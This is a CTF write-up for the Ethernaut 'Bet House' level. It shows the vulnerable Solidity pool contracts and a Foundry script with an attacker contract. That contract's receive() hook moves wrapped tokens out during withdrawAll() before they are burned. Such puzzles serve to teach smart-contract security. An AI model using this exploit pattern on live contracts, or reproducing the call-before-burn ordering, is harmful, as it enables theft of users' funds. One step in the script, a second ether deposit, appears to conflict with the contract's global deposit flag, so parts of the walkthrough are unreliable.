---
layout: post
title: "[Ethernaut] 34.Bet House"
tags: blockchain ethernaut foundry low-level_call external_call
---

# Analysis

---

The goal is “become a bettor”.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import {Ownable} from "openzeppelin-contracts-08/access/Ownable.sol";
import {ReentrancyGuard} from "openzeppelin-contracts-08/security/ReentrancyGuard.sol";

contract BetHouse {
    address public pool;
    uint256 private constant BET_PRICE = 20;
    mapping(address => bool) private bettors;

    error InsufficientFunds();
    error FundsNotLocked();

    constructor(address pool_) {
        pool = pool_;
    }

    function makeBet(address bettor_) external {
        if (Pool(pool).balanceOf(msg.sender) < BET_PRICE) {
            revert InsufficientFunds();
        }
        if (!Pool(pool).depositsLocked(msg.sender)) revert FundsNotLocked();
        bettors[bettor_] = true;
    }

    function isBettor(address bettor_) external view returns (bool) {
        return bettors[bettor_];
    }
}

contract Pool is ReentrancyGuard {
    address public wrappedToken;
    address public depositToken;

    mapping(address => uint256) private depositedEther;
    mapping(address => uint256) private depositedPDT;
    mapping(address => bool) private depositsLockedMap;
    bool private alreadyDeposited;

    error DepositsAreLocked();
    error InvalidDeposit();
    error AlreadyDeposited();
    error InsufficientAllowance();

    constructor(address wrappedToken_, address depositToken_) {
        wrappedToken = wrappedToken_;
        depositToken = depositToken_;
    }

    /**
     * @dev Provide 10 wrapped tokens for 0.001 ether deposited and
     *      1 wrapped token for 1 pool deposit token (PDT) deposited.
     *  The ether can only be deposited once per account.
     */
    function deposit(uint256 value_) external payable {
        // check if deposits are locked
        if (depositsLockedMap[msg.sender]) revert DepositsAreLocked();

        uint256 _valueToMint;
        // check to deposit ether
        if (msg.value == 0.001 ether) {
            if (alreadyDeposited) revert AlreadyDeposited();
            depositedEther[msg.sender] += msg.value;
            alreadyDeposited = true;
            _valueToMint += 10;
        }
        // check to deposit PDT
        if (value_ > 0) {
            if (PoolToken(depositToken).allowance(msg.sender, address(this)) < value_) revert InsufficientAllowance();
            depositedPDT[msg.sender] += value_;
            PoolToken(depositToken).transferFrom(msg.sender, address(this), value_);
            _valueToMint += value_;
        }
        if (_valueToMint == 0) revert InvalidDeposit();
        PoolToken(wrappedToken).mint(msg.sender, _valueToMint);
    }

    function withdrawAll() external nonReentrant {
        // send the PDT to the user
        uint256 _depositedValue = depositedPDT[msg.sender];
        if (_depositedValue > 0) {
            depositedPDT[msg.sender] = 0;
            PoolToken(depositToken).transfer(msg.sender, _depositedValue);
        }

        // send the ether to the user
        _depositedValue = depositedEther[msg.sender];
        if (_depositedValue > 0) {
            depositedEther[msg.sender] = 0;
            payable(msg.sender).call{value: _depositedValue}("");
        }

        PoolToken(wrappedToken).burn(msg.sender, balanceOf(msg.sender));
    }

    function lockDeposits() external {
        depositsLockedMap[msg.sender] = true;
    }

    function depositsLocked(address account_) external view returns (bool) {
        return depositsLockedMap[account_];
    }

    function balanceOf(address account_) public view returns (uint256) {
        return PoolToken(wrappedToken).balanceOf(account_);
    }
}

contract PoolToken is ERC20, Ownable {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) Ownable() {}

    function mint(address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external onlyOwner {
        _burn(account, amount);
    }
}
```

# Exploit

---

The `deposit()` function mints 10 `wrappedToken` in exchange for a deposit of `0.001 ether`. While the acquired tokens can be transferred immediately, the `withdrawAll()` function executes an external call to `msg.sender`, which can be leveraged for exploitation.

By deploying a malicious contract, the execution flow can be hijacked via the `receive()` function to transfer all `wrappedToken` assets to an my address before the `burn()` operation within `withdrawAll()` is finalized. Consequently, the token balance effectively becomes zero at the moment of the burn execution.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/BetHouse.sol";
import "forge-std/Script.sol";

contract Ex {
    address player_;
    address bh_;
    address pool_;
    address wrappedToken_;

    constructor(address bh, address player) {
        player_ = player;
        bh_ = bh;
        pool_ = BetHouse(bh_).pool();
        wrappedToken_ = Pool(pool_).wrappedToken();
    }

    function ex() public payable {
        Pool(pool_).deposit{value: 0.001 ether}(0);
        Pool(pool_).withdrawAll();
    }

    receive() external payable {
        PoolToken(wrappedToken_).transfer(player_, PoolToken(wrappedToken_).balanceOf(address(this)));
    }
}

contract BetHouseSol is Script {
    BetHouse public bh_ = BetHouse(0x79584991826ED6A24628eA66865Ce0C044Fea450);

    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex(address(bh_), msg.sender);
        ex.ex{value: 0.002 ether}();

        Pool(bh_.pool()).deposit{value: 0.001 ether}(0);
        console.log("wrappedToken balance: ", Pool(bh_.pool()).balanceOf(msg.sender));

        Pool(bh_.pool()).lockDeposits();
        console.log("depositsLocked: ", Pool(bh_.pool()).depositsLocked(msg.sender));

        bh_.makeBet(msg.sender);
        console.log("isBettor: ", bh_.isBettor(msg.sender));

        vm.stopBroadcast();
    }
}
```

Finally, we can satisfy all prerequisites for executing `makeBet()` by directly invoking `deposit()` and subsequently calling the publicly accessible `lockDeposits()` function.